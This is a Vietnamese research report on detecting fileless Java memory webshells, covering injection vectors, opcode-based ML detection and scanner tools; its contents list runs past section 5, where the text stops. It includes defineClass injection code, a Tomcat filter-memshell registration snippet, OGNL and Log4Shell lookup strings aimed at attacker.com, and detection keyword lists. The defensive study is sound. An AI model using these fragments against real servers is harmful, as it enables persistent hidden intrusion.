# Báo Cáo Kiến Thức Nền: Phát Hiện Java Memory Webshell
## Phân Tích Tĩnh, Phân Tích Động và Kiến Trúc Hệ Thống ShellBreaker

> Phiên bản: 1.0 | Ngày: 2026-05-28 | Tác giả: LNQuynh1009

---

## Mục lục

1. [Webshell — Định nghĩa và phân loại](#1-webshell--định-nghĩa-và-phân-loại)
2. [Fileless Webshell — Mối đe dọa thế hệ mới](#2-fileless-webshell--mối-đe-dọa-thế-hệ-mới)
3. [Phân tích tĩnh (Static Analysis)](#3-phân-tích-tĩnh-static-analysis)
4. [Phân tích động (Dynamic Analysis)](#4-phân-tích-động-dynamic-analysis)
5. [Kiến trúc công cụ: copagent và c0ny1](#5-kiến-trúc-công-cụ-copagent-và-c0ny1)
6. [Phân tích ML dựa trên Opcode — Nền tảng lý thuyết](#6-phân-tích-ml-dựa-trên-opcode--nền-tảng-lý-thuyết)
7. [Kiến trúc ShellBreaker](#7-kiến-trúc-shellbreaker)
8. [Kết quả thực nghiệm và so sánh](#8-kết-quả-thực-nghiệm-và-so-sánh)
9. [Hạn chế và thách thức mở](#9-hạn-chế-và-thách-thức-mở)
10. [Tài liệu tham khảo](#10-tài-liệu-tham-khảo)

---

## 1. Webshell — Định nghĩa và phân loại

### 1.1 Định nghĩa

Webshell là một đoạn mã độc hại được nhúng hoặc triển khai lên một máy chủ web, cho phép kẻ tấn công thực thi lệnh từ xa thông qua giao thức HTTP/HTTPS. Về bản chất, webshell đóng vai trò như một backdoor: sau khi kẻ tấn công xâm nhập thành công lần đầu (thông qua lỗ hổng upload, RCE, SQL injection, v.v.), chúng để lại webshell để duy trì quyền kiểm soát lâu dài mà không cần khai thác lỗ hổng thêm.

Theo nghiên cứu của Lê Viết Hà (2024, UET), webshell cấu thành một trong những mối đe dọa dai dẳng nhất trong bảo mật ứng dụng web — đặc biệt là trong môi trường doanh nghiệp sử dụng Java Enterprise Edition (Jakarta EE), nơi Tomcat, JBoss, WebLogic và WebSphere là nền tảng phổ biến.

### 1.2 Phân loại theo ngôn ngữ và nền tảng

| Loại | Ngôn ngữ | Nền tảng điển hình | Ghi chú |
|------|----------|-------------------|---------|
| PHP webshell | PHP | Apache/Nginx + PHP-FPM | Phổ biến nhất (c99, r57, WSO shell) |
| ASP/ASPX webshell | ASP.NET (VB/C#) | IIS + .NET Framework | China Chopper phổ biến trên ASPX |
| JSP webshell | Java (JSP/Servlet) | Tomcat, JBoss, WebLogic | Compiled thành `.class` bởi Jasper |
| Python/Ruby/Node.js | Scripting languages | Gunicorn, Unicorn, Express | Ít phổ biến hơn trong enterprise |
| **Java Memory Webshell** | Java bytecode | JVM (mọi container) | **Không có file, tồn tại trong heap** |

### 1.3 Phân loại theo cơ chế tồn tại

#### 1.3.1 File-based webshell

File-based webshell là loại webshell truyền thống — tồn tại dưới dạng file trên đĩa cứng của máy chủ. Đối với ứng dụng Java:

- **JSP webshell**: Kẻ tấn công upload file `.jsp` vào thư mục webroot. Khi request đến, Tomcat's Jasper compiler biên dịch JSP thành `.class` trong thư mục `work/`. Webshell nằm ở cả hai dạng: file `.jsp` nguồn và file `.class` được biên dịch.
- **WAR webshell**: Deploy WAR archive chứa servlet độc hại. Các container Java EE hỗ trợ hot-deploy WAR — kẻ tấn công với quyền truy cập vào Management Console (Tomcat Manager, JBoss Admin) có thể deploy WAR từ xa.
- **Serialized object webshell**: Nhúng webshell vào payload deserialization — class được load khi server deserialization thực thi.

Điểm đặc trưng: file-based webshell **để lại dấu vết trên đĩa**, giúp các công cụ antivirus, file integrity monitoring (FIM), và IDS truyền thống có thể phát hiện.

#### 1.3.2 Memory webshell (Fileless webshell)

Memory webshell là tiến hóa thế hệ mới — mã độc **không tồn tại trên đĩa** sau khi inject. Lớp webshell này exploit đặc điểm kiến trúc của JVM: một class Java có thể được định nghĩa trực tiếp trong heap thông qua `ClassLoader.defineClass()` mà không cần file `.class` tương ứng trên filesystem.

Khác biệt căn bản:

| Đặc điểm | File-based | Memory (Fileless) |
|----------|-----------|------------------|
| Tồn tại sau reboot | Có | Không (bị mất khi JVM restart) |
| Để lại dấu vết disk | Có | Không |
| Antivirus phát hiện | Có thể | Hầu như không |
| File integrity check | Phát hiện | Bỏ qua |
| Tồn tại trong RAM | Chỉ khi chạy | Suốt vòng đời JVM |
| Persistence mechanism | File upload, WAR deploy | Java Instrumentation, serialization gadget |

---

## 2. Fileless Webshell — Mối đe dọa thế hệ mới

### 2.1 Nền tảng kỹ thuật: JVM ClassLoader

Để hiểu fileless webshell, cần nắm rõ cơ chế load class trong JVM.

```
Java source (.java)
    → javac → Bytecode (.class file)
        → ClassLoader → JVM Method Area (heap)
            → Class object → Instance → Execution
```

JVM định nghĩa ba loại classloader theo mô hình delegation:

1. **Bootstrap ClassLoader**: Load core JDK classes (`java.lang.*`, `java.util.*`)
2. **Extension/Platform ClassLoader**: Load JDK extensions
3. **Application ClassLoader**: Load application classes từ classpath

Phương thức `ClassLoader.defineClass(String name, byte[] b, int off, int len)` là API protected cho phép **tạo Class object trực tiếp từ byte array** — không cần file trên disk. Đây là nền tảng của mọi fileless webshell technique.

```java
// Đây là cơ chế cốt lõi của fileless injection
byte[] classBytes = /* nhận từ HTTP request, deserialization, hoặc network */;
ClassLoader cl = Thread.currentThread().getContextClassLoader();
// Invoke protected method qua reflection
Method defineClass = ClassLoader.class.getDeclaredMethod(
    "defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class<?> maliciousClass = (Class<?>) defineClass.invoke(cl,
    "com.evil.MemFilter", classBytes, 0, classBytes.length);
```

### 2.2 Các vector inject fileless webshell

#### 2.2.1 Java Deserialization Gadget Chain

Đây là vector phổ biến nhất. Lỗ hổng deserialization trong các thư viện Java (Apache Commons Collections, Spring Framework, Jackson, Kryo) cho phép kẻ tấn công gửi một payload serialized — khi server deserialize, chuỗi gadget thực thi, cuối cùng gọi `defineClass` với bytecode của webshell.

Các công cụ tạo payload: **ysoserial**, **marshalsec**, **ysomap**. Các target điển hình:
- Apache Struts2 (CVE-2017-5638, CVE-2020-17530)
- Java RMI (JBoss, WebLogic)
- Spring HTTP Invoker
- Apache Shiro RememberMe cookie (ysoserial + CBC padding oracle)

#### 2.2.2 Expression Language / OGNL Injection

Struts2 OGNL và Spring SpEL cho phép thực thi Java expression. Kẻ tấn công có thể inject expression gọi `ClassLoader.defineClass()` trực tiếp:

```
${(new java.lang.ClassLoader(){}).defineClass(name, bytes, 0, len)}
```

Hoặc thông qua OGNL trong Struts2:
```
%{(#cls=@java.lang.Class@forName("java.lang.ClassLoader"))...}
```

#### 2.2.3 JNDI Injection (Log4Shell — CVE-2021-44228)

Log4Shell là lỗ hổng nghiêm trọng nhất trong lịch sử Java enterprise (CVSS 10.0). Khi Log4j2 log một chuỗi chứa `${jndi:ldap://attacker.com/a}`, nó thực hiện JNDI lookup và có thể load class từ remote LDAP/RMI server. Class được load là fileless — được inject vào JVM heap mà không cần file local.

#### 2.2.4 Direct defineClass via HTTP

Đơn giản nhất: application có endpoint nhận bytecode qua HTTP (upload, API) và gọi `defineClass` trực tiếp. Một số framework hoặc plugin debug vô tình tạo ra vector này.

#### 2.2.5 Java Instrumentation API

Sử dụng `java.lang.instrument.Instrumentation` (Attach API) — attacker attach một Java Agent vào JVM đang chạy:

```bash
# Attach API cho phép load agent vào JVM bất kỳ đang chạy (cùng user)
java -jar attacker-agent.jar <target-pid>
```

Agent sử dụng `Instrumentation.retransformClasses()` để thay thế bytecode của class đã load, hoặc define class mới qua `Instrumentation.appendToBootstrapClassLoaderSearch()`.

### 2.3 Phân loại fileless webshell theo kỹ thuật inject

Sau khi bypass vào JVM, fileless webshell sử dụng reflection để đăng ký vào pipeline xử lý request của web container:

#### 2.3.1 Filter Memshell (Phổ biến nhất — 27/82 mẫu trong dataset)

Filter trong Servlet specification (javax.servlet.Filter) được thực thi trước mọi request đến servlet. Attacker tạo một Filter implement interface `javax.servlet.Filter`, sau đó đăng ký vào `StandardContext` của Tomcat qua reflection:

```java
// 1. Lấy StandardContext từ request hierarchy
StandardContext ctx = (StandardContext) ((Request)((RequestFacade)request)
    .getRequest()).getContext();

// 2. Tạo FilterDef
FilterDef filterDef = new FilterDef();
filterDef.setFilter(maliciousFilter);
filterDef.setFilterName("securityFilter");
ctx.addFilterDef(filterDef);

// 3. Tạo FilterMap — ánh xạ tới mọi URL
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("securityFilter");
filterMap.addURLPattern("/*");
ctx.addFilterMapBefore(filterMap);

// 4. Rebuild filter chain cache
((FilterChain)ctx).getFilterChain().reset();
```

Từ thời điểm này, mọi HTTP request đến server đều đi qua filter độc hại — kể cả không có file nào trên disk.

#### 2.3.2 Listener Memshell (24/82 mẫu)

Implement `ServletRequestListener`, `HttpSessionListener`, `ServletContextListener` — được gọi tại mỗi sự kiện vòng đời request/session. Ít phổ biến hơn Filter nhưng khó phát hiện hơn vì interface ít nghi ngờ hơn.

#### 2.3.3 Servlet Memshell (6/82 mẫu)

Extends `HttpServlet`, đăng ký một Servlet mới vào `StandardContext`. Trực tiếp nhất nhưng cũng dễ phát hiện nhất.

#### 2.3.4 Spring Interceptor Memshell (5/82 mẫu)

Implement `org.springframework.web.servlet.HandlerInterceptor`, inject vào `HandlerMapping` chain của Spring MVC. Đặc biệt nguy hiểm vì Spring không bị ảnh hưởng bởi Tomcat security filter.

#### 2.3.5 Tomcat Valve Memshell (4/82 mẫu)

Tomcat Pipeline/Valve là layer thấp hơn Filter — xử lý request trước cả khi Filter chain bắt đầu. Inject vào `org.apache.catalina.Valve` cho phép bypass cả Filter-level security.

#### 2.3.6 Agent / ClassFileTransformer Memshell (2/82 mẫu)

Đây là loại nguy hiểm nhất: webshell là một Java Agent với `ClassFileTransformer`, có thể **modify bytecode của bất kỳ class nào** khi được load. Attacker có thể patch thẳng vào Tomcat hoặc Spring source classes.

#### 2.3.7 WebSocket Memshell (1/82 mẫu)

Implement `javax.websocket.Endpoint` — ít phổ biến nhưng persistent theo session WebSocket, không bị timeout bởi HTTP server.

### 2.4 Vì sao fileless webshell nguy hiểm

1. **Tàng hình tuyệt đối với công cụ truyền thống**: AV, FIM, SIEM file-based đều mù hoàn toàn.
2. **Khó thu hồi bằng patch**: Không có file để xóa — cần restart JVM toàn bộ.
3. **Tốc độ inject nhanh**: Payload có thể là base64 trong HTTP POST — không cần file transfer.
4. **Obfuscation dễ dàng**: Compile với `-g:none`, obfuscate tên class, encrypt constant pool.
5. **Không để lại artifact forensic**: Các kỹ thuật forensic truyền thống (disk image, log tìm file) không tìm được.

---

## 3. Phân tích tĩnh (Static Analysis)

Phân tích tĩnh là kỹ thuật kiểm tra mã hoặc bytecode của webshell **mà không thực thi nó**. Đây là phương pháp phổ biến, an toàn, và có thể áp dụng quy mô lớn.

### 3.1 Phân tích Signature (Chữ ký)

#### 3.1.1 String Matching

Phương pháp đơn giản nhất: tìm kiếm chuỗi ký tự đặc trưng trong file. Đối với Java bytecode, constant pool lưu trữ tất cả string literals, class references, và method references — có thể đọc trực tiếp bằng `javap -verbose` hoặc parse bytecode thủ công.

Các chuỗi đặc trưng trong Java webshell:
```
// Command execution
"java/lang/Runtime"
"exec"
"/bin/sh"
"cmd.exe"
"ProcessBuilder"

// Class loading / injection
"defineClass"
"ClassLoader"
"sun/misc/Unsafe"
"defineAnonymousClass"

// Webshell tool fingerprints
"Godzilla"
"Behinder"
"AntSword"
"IceScorpion"
"ReGeorg"
```

**Ưu điểm**: Nhanh, không yêu cầu hiểu bytecode, dễ viết rule mới.

**Nhược điểm**: Dễ bypass bằng obfuscation (string split, XOR encoding, reflection với string build dynamically). Ví dụ:
```java
// Bypass naive string matching
String cmd = new String(new char[]{'R','u','n','t','i','m','e'});
Class.forName("java.lang." + cmd).getMethod("exec", String.class)...
```

#### 3.1.2 Hash-based Detection

Tính MD5/SHA256 của file `.class` hoặc toàn bộ WAR, so sánh với database hash đã biết. Phương pháp này tương đương với antivirus signature database.

**Nhược điểm nghiêm trọng**: Mọi sự thay đổi nhỏ nhất (đổi tên class, thêm một comment, compile lại) đều cho hash khác hoàn toàn. Attacker có thể trivially bypass bằng cách compile lại với seed khác.

#### 3.1.3 Heuristic Rule-based (c0ny1-inspired)

Tinh vi hơn: thay vì match exact string, định nghĩa **bộ rules có trọng số** dựa trên combination của nhiều indicator. Đây là approach của c0ny1/java-memshell-scanner và được ShellBreaker kế thừa, mở rộng.

Ví dụ logic rule:
```
IF (implements Filter AND calls Runtime.exec)       → score = 6  → HIGH
IF (implements Filter)                              → score = 3  → MEDIUM
IF (missing SourceFile attribute AND short classname) → score = 2 → MEDIUM
IF (tool fingerprint detected)                      → score = 4  → HIGH
```

Approach này robust hơn signature vì:
- Partial match vẫn cho score
- Weighted combination tránh false positive từ legitimate class
- Dễ mở rộng thêm rule mới không cần retrain model

### 3.2 Phân tích Bytecode: Cơ sở lý thuyết

Java bytecode là ngôn ngữ trung gian (intermediate representation) được JVM thực thi. Mỗi file `.class` gồm:

```
ClassFile {
    magic                 u4    (0xCAFEBABE)
    minor_version         u2
    major_version         u2
    constant_pool_count   u2
    constant_pool[]       cp_info    ← string literals, class refs, method refs
    access_flags          u2
    this_class            u2
    super_class           u2
    interfaces_count      u2
    interfaces[]          u2         ← interface list (quan trọng cho webshell detection)
    fields_count          u2
    fields[]              field_info
    methods_count         u2
    methods[]             method_info ← chứa bytecode instructions
    attributes_count      u2
    attributes[]          attribute_info  ← SourceFile, LineNumberTable, v.v.
}
```

**Opcode** là các instruction trong method body — 1 byte opcode + optional operands. JVM Specification định nghĩa 205 opcode, nhưng thực tế chỉ 149 opcode được sử dụng (không deprecated, không reserved).

Ví dụ disassembly bằng `javap -c`:
```
public void doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain);
  Code:
     0: aload_1               ← load local var 1 (request) onto stack
     1: checkcast   #7        ← cast to HttpServletRequest
     4: astore_2              ← store in local var 2
     5: aload_2               ← load request
     6: ldc         #8        ← load string "X-Cmd" onto stack
     8: invokevirtual #9      ← call HttpServletRequest.getHeader("X-Cmd")
    11: astore_3              ← store result in cmd variable
    12: aload_3               ← load cmd
    13: ifnull       50       ← if null, jump to 50 (skip execution)
    16: invokestatic  #10     ← Runtime.getRuntime()
    19: aload_3
    20: invokevirtual #11     ← Runtime.exec(cmd)
    ...
```

**Tại sao opcode hữu ích cho phát hiện webshell?**

Opcode mang thông tin về **hành vi** của code, không phải tên (có thể bị obfuscate). Ngay cả khi tên class bị đổi thành `A`, tên method bị đổi thành `b`, string được encrypt — opcode sequence vẫn phản ánh:
- Có gọi method invocation không? (invokevirtual, invokestatic)
- Có xử lý exception nhiều không? (athrow, astore trong catch block)
- Có nhiều reflection pattern không? (invokedynamic, invokevirtual nhiều lần)
- Tỉ lệ các loại operation như thế nào?

### 3.3 Phân tích Opcode: Từ Sequence đến Feature Vector

#### 3.3.1 Bước 1: Disassemble và chuẩn hóa opcode

Dùng `javap -c -p -verbose` để disassemble. Sau đó **chuẩn hóa opcode short-form variants** về canonical form:

```python
OPCODE_NORM = {
    "iconst_0": "iconst", "iconst_1": "iconst", ..., "iconst_5": "iconst",
    "iload_0":  "iload",  "iload_1":  "iload",  ..., "iload_3":  "iload",
    "astore_0": "astore", "astore_1": "astore", ..., "astore_3": "astore",
    # ... 40+ normalization rules
}
```

Lý do: JVM tối ưu hóa các opcode phổ biến thành variants 1-byte (thay vì 2-byte có operand). `iload_0` và `iload 0` có cùng ngữ nghĩa — chuẩn hóa để từ điển opcode nhỏ hơn (149 thay vì ~200).

#### 3.3.2 Bước 2: Unigram — Tần suất opcode

Đếm số lần xuất hiện của mỗi opcode trong 149-opcode vocabulary, normalize theo tổng số opcode:

```
unigram[i] = count(opcode_i) / total_opcodes
```

Vector 149 chiều này nắm bắt **phân phối tổng thể** của opcode — webshell thường có tỉ lệ cao hơn của `invokevirtual`, `ldc` (string load), `checkcast`, trong khi benign class có nhiều `getfield`/`putfield` (data access patterns).

#### 3.3.3 Bước 3: Bigram — Transition giữa các cặp opcode

Bigram nắm bắt **thứ tự** của opcode — thông tin bổ sung mà unigram bỏ qua:

```
bigram[i*N + j] = count(ops[k] == i AND ops[k+1] == j) / (total - 1)
```

Ma trận 149×149 = 22,201 chiều. Rất sparse (hầu hết là zero) nhưng chứa thông tin hành vi quan trọng.

Ví dụ pattern đặc trưng webshell:
- `ldc → invokevirtual`: Load string constant rồi gọi method (getHeader, exec, v.v.)
- `invokevirtual → checkcast`: Gọi method reflection rồi cast kết quả
- `aload → invokevirtual → astore → aload → ifnull`: Pattern xử lý command response

Bigram là ý tưởng cốt lõi từ paper **GAShellBreaker (Electronics MDPI 2025)**: các tác giả nhận thấy rằng ma trận bigram 149×149 khi visualize như grayscale image tạo ra **visual pattern** đặc trưng cho webshell vs benign class.

#### 3.3.4 Bước 4: Metadata Features

10 feature cấu trúc bổ sung không thể capture bằng opcode distribution:

| Feature | Công thức | Ý nghĩa phát hiện |
|---------|-----------|------------------|
| `class_size` | `min(total_ops / 1000, 1.0)` | Webshell compact, ít opcode |
| `has_source_file` | `"SourceFile:" in javap` | Class inject không có debug info |
| `is_inner_class` | `"$" in classname` | Anonymous class = dấu hiệu dynamic generation |
| `servlet_iface` | implements Filter/Servlet check | Core webshell indicator |
| `has_runtime_exec` | `"java/lang/Runtime" in javap` | Command execution |
| `has_define_class` | `"defineClass" in javap` | Dynamic class loading |
| `has_url_classloader` | `"URLClassLoader" in javap` | Remote class loading |
| `invoke_ratio` | `invoke_count / total` | Webshell gọi nhiều external method |
| `reflect_ratio` | `reflect_count / total` | Reflection-heavy code |
| `athrow_ratio` | `athrow_count / total` | Exception handling pattern |

### 3.4 Phân tích Machine Learning trên Bytecode

Sau khi có feature vector, bài toán trở thành **binary classification**: webshell (1) vs benign (0).

#### 3.4.1 Traditional ML: SVM, Random Forest, XGBoost

**Support Vector Machine (SVM)** với kernel RBF đã được dùng trong nhiều nghiên cứu phát hiện webshell (Gu et al., 2019; Tian et al., 2018). Với feature vector 22,360 chiều phần lớn sparse, SVM hoạt động tốt nhưng chậm hơn tree-based methods.

**Random Forest** mạnh với feature quan trọng selection nhưng kém hơn XGBoost với dữ liệu imbalanced.

**XGBoost (Extreme Gradient Boosting)** là lựa chọn tốt nhất cho bài toán này vì:
1. **Xử lý sparse matrix natively**: Feature vector bigram 99%+ zero — XGBoost với `tree_method="hist"` và `colsample_bytree=0.4` xử lý hiệu quả mà không cần dense representation.
2. **Class imbalance**: `scale_pos_weight = n_benign / n_webshell` (~4.9x) — cân bằng loss function.
3. **Không cần GPU**: Train local trong ~5 phút cho dataset 5,000+ file.
4. **Interpretability**: Feature importance có thể extract được.
5. **Regularization**: `reg_alpha`, `reg_lambda` giảm overfitting với sparse features.

Hyperparameters trong ShellBreaker:
```python
XGB_PARAMS = dict(
    n_estimators     = 600,      # Tối đa 600 cây, early stopping từ 40 rounds
    max_depth        = 6,        # Đủ sâu để capture interaction features
    learning_rate    = 0.05,     # Low learning rate với nhiều cây
    subsample        = 0.8,      # Stochastic boosting — giảm variance
    colsample_bytree = 0.4,      # Quan trọng nhất: chỉ sample 40% features/cây
    min_child_weight = 3,        # Tránh leaf quá nhỏ (overfitting)
    reg_alpha        = 0.1,      # L1 regularization
    reg_lambda       = 1.0,      # L2 regularization
)
```

#### 3.4.2 Deep Learning: CNN trên Bigram Matrix Image

Paper **GAShellBreaker** (Gao et al., Electronics MDPI 2025) đề xuất approach sáng tạo: coi bigram matrix 149×149 như một **ảnh grayscale** và apply image classification.

Pipeline:
```
JVM bytecode
    → javap -c → opcode sequence
    → Build 149×149 bigram count matrix
    → Normalize: value_i = count_i / max_count * 255  (→ grayscale pixel)
    → Save PNG 149×149
    → ResNet50 (pretrained ImageNet) → Fine-tune → Binary classification
```

Tại sao approach image hoạt động? Vì opcode bigram matrix của webshell tạo ra **visual texture pattern** khác biệt so với benign class:
- Webshell: nhiều pixel sáng ở vùng `invokevirtual`, `ldc`, `aload` transitions
- Benign library class: pattern phân tán đều hơn, nhiều `getfield`/`putfield` pixel

**Tuy nhiên**, GAShellBreaker trong paper gốc dùng ResNet50 — ShellBreaker phát hiện rằng **XGBoost tốt hơn đáng kể** vì:
- Feature matrix quá sparse (~50-100 non-zero trên 22,201 cells) → CNN tốn tài nguyên để học từ noise
- XGBoost với colsample_bytree tự động focus vào sparse features có ý nghĩa
- XGBoost F1 = 0.985 vs ResNet50 F1 = 0.62 trên cùng dataset

#### 3.4.3 Deep Learning: BERT-based (Pu et al., 2022)

Nghiên cứu của Pu et al. (2022) áp dụng BERT embedding cho JSP webshell detection. Thay vì phân tích bytecode, họ phân tích **source code token** của file JSP:

```
JSP source code
    → Tokenize (AST-based, không phải word tokenizer)
    → BERT embedding (768-dim per token)
    → CLS token → Binary classifier
```

Approach này hiệu quả với JSP obfuscation (hex encoding, base64 decode chains) vì BERT capture ngữ nghĩa cross-token. Tuy nhiên, **không áp dụng được cho fileless webshell** vì không có source code — chỉ có bytecode.

#### 3.4.4 Threshold Optimization

Một thách thức thực tế: **precision-recall tradeoff**. Trong môi trường production:
- Threshold quá cao → miss webshell (high false negative rate)
- Threshold quá thấp → alert mệt mỏi (alert fatigue)

ShellBreaker dùng **threshold optimization trên validation set**:

```python
def find_threshold(val_y, val_probs, min_prec=0.50):
    prec, rec, thr = precision_recall_curve(val_y, val_probs)
    # Tìm threshold thấp nhất sao cho precision >= 0.50
    # Và trong các threshold thỏa mãn: maximize recall
    mask = prec[:-1] >= min_prec
    return float(thr[mask][argmax(rec[:-1][mask])])
```

Chạy 3 lần độc lập (3 different random seeds), lấy trung bình threshold. Methodology này theo đúng paper gốc GAShellBreaker — đảm bảo kết quả không phụ thuộc vào seed cụ thể.

### 3.5 Vấn đề dataset contamination

Một thách thức ít được đề cập trong nghiên cứu: **chất lượng dataset**. Các repo webshell trên GitHub không chỉ chứa payload độc hại — chúng còn chứa hàng trăm utility class, test class, RMI client, exception class, v.v. được label nhầm là webshell vì họ ở cùng repo.

Dataset ban đầu của ShellBreaker v3.0 có ~77.8% label noise trong webshell_file. Điều này giải thích tại sao F1 chỉ đạt 0.890 — model đang học từ dữ liệu nhiễu.

**Giải pháp signal filter** (v4.0): Mỗi `.class` phải chứa ít nhất một trong 17 byte patterns malicious (raw bytes scan trước khi decompile):

```python
MALICIOUS_SIGNALS = [
    b"servlet/Filter", b"servlet/Servlet", b"catalina/Valve",
    b"HandlerInterceptor", b"websocket/Endpoint", b"ChannelHandler",
    b"java/lang/Runtime", b"ProcessBuilder",
    b"defineClass", b"defineAnonymousClass",
    b"ScriptEngine", b"GroovyClassLoader", b"JavaCompiler",
    b"URLClassLoader", b"sun/misc/Unsafe", b"jdk/internal/misc/Unsafe",
]
```

Sau filter: 876 webshell thực (+70% từ 514), F1 tăng lên 0.985.

---

## 4. Phân tích động (Dynamic Analysis)

Phân tích động là kỹ thuật phát hiện webshell **bằng cách quan sát hành vi khi thực thi**. Đây là phương pháp bổ sung cho static analysis — đặc biệt quan trọng với fileless webshell mà static analysis bỏ qua.

### 4.1 RASP — Runtime Application Self-Protection

**RASP** là kỹ thuật nhúng agent bảo mật trực tiếp vào runtime của application. Thay vì monitor từ bên ngoài, RASP **chạy bên trong JVM** và intercept các API call nguy hiểm.

Ví dụ: **OpenRASP** (Baidu, open-source) hook các method:
- `Runtime.exec()` → kiểm tra argument có phải shell command không
- `ClassLoader.defineClass()` → kiểm tra bytecode có chứa webshell pattern không
- `ProcessBuilder.start()` → kiểm tra command
- JDBC → phát hiện SQL injection
- File I/O → phát hiện path traversal

**Ưu điểm RASP**:
- Context-aware: biết class nào đang gọi API, request đến từ đâu
- Chặn execution thay vì chỉ alert
- Không phụ thuộc vào file pattern

**Nhược điểm**:
- Performance overhead (hook mọi API call)
- Có thể bị bypass qua reflection chains đủ sâu
- Cần integrate vào application runtime → không thể deploy externally

### 4.2 Java Instrumentation API — ClassFileTransformer

Java Instrumentation API (JSR-163, `java.lang.instrument`) cung cấp cơ chế để intercept class loading tại JVM level:

```java
// Agent hook mọi class load trong JVM
Instrumentation.addTransformer(new ClassFileTransformer() {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                           Class<?> classBeingRedefined,
                           ProtectionDomain protectionDomain,
                           byte[] classfileBuffer) {
        // classfileBuffer là raw bytecode — phân tích tại đây
        // Trả về null = không thay đổi bytecode
        // Trả về byte[] khác = patch bytecode trước khi class được load
        return analyzeAndMaybePatch(className, classfileBuffer);
    }
});
```

Đây là cơ chế mà **copagent**, **c0ny1**, và **ShellBreaker Java Agent** đều sử dụng. Khác biệt nằm ở **timing** và **phân tích**:
- **premain**: Hook từ JVM startup — bắt mọi class load từ đầu
- **agentmain**: Attach sau khi JVM đang chạy — dùng `retransformClasses()` để scan class đã load

### 4.3 Sandbox-based Detection

Chạy webshell trong môi trường sandbox cô lập, monitor syscall, network call, file access. Phổ biến hơn với malware analysis (Cuckoo Sandbox) nhưng ít dùng cho webshell vì:
- Webshell cần HTTP request trigger để thực thi — khó simulate chính xác
- Sandbox evasion kỹ thuật (check environment, sleep, anti-VM) đơn giản với Java
- Không thực tế cho real-time detection (latency cao)

### 4.4 Network Traffic Analysis

Monitor HTTP traffic để phát hiện **webshell communication pattern**:
- Tham số HTTP bất thường chứa command
- Header đặc trưng (X-Cmd, X-Password)
- Response pattern: output của shell command (dòng đầu chứa uid=, hostname)
- Base64-encoded payloads trong POST body

Approach này có thể được dùng **kết hợp** với static analysis để tăng confidence. Tuy nhiên với HTTPS ubiquitous, cần SSL inspection — không phải lúc nào cũng khả thi.

---

## 5. Kiến trúc công cụ: copagent và c0ny1

### 5.1 copagent (LandGrey) — Java Agent Static Scanner

**copagent** (https://github.com/LandGrey/copagent) là công cụ phát hiện Java memory webshell dựa trên Java Instrumentation, được phát triển bởi LandGrey.

#### Kiến trúc copagent

```
copagent.jar (Java Agent)
    │
    ├── premain entry (static load với -javaagent flag)
    │       └── Đăng ký ClassFileTransformer
    │
    └── ClassFileTransformer.transform()
            ├── Skip system/framework packages
            ├── ASM ClassReader → parse raw bytecode
            ├── Check interfaces: Filter, Servlet, Listener
            ├── Check method calls: exec, defineClass, URLClassLoader
            ├── Check constant pool strings: shell keywords
            └── If suspicious → dump .class to disk
```

#### Cơ chế phát hiện của copagent

copagent phân tích bytecode theo hai lớp:

**Lớp 1 — Interface matching**: Kiểm tra class implements một trong các interface webshell-related:
- `javax.servlet.Filter`
- `javax.servlet.Servlet`
- `javax.servlet.http.HttpServlet`
- `javax.servlet.ServletRequestListener`
- `javax.servlet.http.HttpSessionListener`

**Lớp 2 — API pattern matching**: Scan constant pool cho các string pattern nguy hiểm:
- `Runtime.exec`
- `defineClass`
- `URLClassLoader`
- Shell tool signatures

#### Giới hạn của copagent

1. **Chỉ premain, không có agentmain**: Class inject trước khi copagent được load sẽ bị bỏ qua — không thể retrospective scan.
2. **Binary output**: Chỉ dump file, không có scoring system, không tiered alert.
3. **Interface list cố định**: Không có Spring interceptor, Tomcat Valve, WebSocket, Agent interface.
4. **Không tích hợp SIEM**: Output chỉ là file dump.
5. **Không có ML layer**: Không phân biệt được webshell phức tạp không dùng interface known.

### 5.2 c0ny1/java-memshell-scanner — Runtime Heap Scanner

**c0ny1/java-memshell-scanner** (https://github.com/c0ny1/java-memshell-scanner) là công cụ scan class đã tồn tại trong JVM heap — khác với copagent ở chỗ nó chạy sau khi inject đã xảy ra.

#### Kiến trúc c0ny1

```
java-memshell-scanner.jsp (deploy như JSP)
    │
    └── Servlet handler → scan toàn bộ JVM heap
            │
            ├── Instrumentation.getAllLoadedClasses()
            │       └── Lấy TOÀN BỘ class đang load trong JVM
            │
            ├── Với mỗi class:
            │       ├── Check ClassLoader provenance
            │       │     ├── isAnonymousLoader(cl)?
            │       │     ├── URLClassLoader với unknown URL?
            │       │     └── Custom ClassLoader không thuộc framework?
            │       │
            │       ├── Check ProtectionDomain
            │       │     ├── CodeSource == null? (class từ RAM, không có file)
            │       │     └── Location không match known JAR?
            │       │
            │       ├── Check class hierarchy
            │       │     ├── implements Filter/Servlet/Listener?
            │       │     └── Superclass suspicious?
            │       │
            │       └── String scan trong getBytes() của class
            │             ├── Godzilla fingerprints
            │             ├── Behinder fingerprints
            │             └── Command execution strings
            │
            └── Output: HTML report với danh sách suspicious classes
```

#### Ưu điểm của c0ny1 so với copagent

1. **Retrospective scan**: Bắt được class đã inject trước khi scanner chạy.
2. **ClassLoader chain walk**: Phân tích nguồn gốc của ClassLoader — class từ `PayloadLoader` custom sẽ bị flag.
3. **CodeSource null check**: `protectionDomain.getCodeSource() == null` là dấu hiệu mạnh nhất của fileless — class thuần RAM không có code source.
4. **Thread inspection**: Scan running threads để tìm thread có suspicious context ClassLoader.

#### Giới hạn của c0ny1

1. **Incident response only**: Cần deploy JSP → có file trên disk → không phù hợp với continuous monitoring.
2. **Không real-time**: Scan theo yêu cầu, không intercept tại thời điểm inject.
3. **Không ML**: Rule-based only, dễ bị bypass bởi webshell không implement interface known.
4. **Không alert tự động**: Cần analyst manually chạy scan và đọc report.

### 5.3 So sánh tổng quan các công cụ

| Chiều | copagent | c0ny1 | OpenRASP | ShellBreaker |
|-------|----------|-------|----------|-------------|
| **Timing** | Tại thời điểm class load | Sau khi inject | Tại API call | Cả hai (premain + agentmain) |
| **Scope** | Class mới load | Toàn bộ heap | Mọi API call | Class mới + scan cũ |
| **ML layer** | Không | Không | Không | Có (XGBoost) |
| **Scoring** | Binary | Binary | Binary | Weighted (0-12+) |
| **Alert tier** | Dump/Không dump | Report/Không | Block/Allow | CONFIRMED/HIGH/MEDIUM/BENIGN |
